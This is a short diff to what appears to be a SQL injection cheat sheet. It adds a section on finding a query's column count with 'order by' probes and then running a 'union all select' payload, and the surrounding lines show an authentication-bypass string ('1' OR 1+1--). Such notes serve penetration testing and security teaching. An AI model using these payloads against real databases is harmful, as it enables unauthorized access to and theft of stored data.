@@ -15,6 +15,18 @@ To break the statement:
 $SQL = "SELECT * FROM <i>{tablename}</i> WHERE <i>{username}</i> = ' + <b><i>1' OR 1+1--</i></b> + ' AND ' + <b><i>$_POST['password']</i></b>'";
 </pre>
 
+Order by:
+```SQL
+=1 order by 1
+=1 order by 2
+=1 order by 3
+.
+.
+.
+Until error occurs, then:
+=1 union all select 1, 2, 3...
+```
+
 ### Simple SQL injection test
 ```SQL
 '
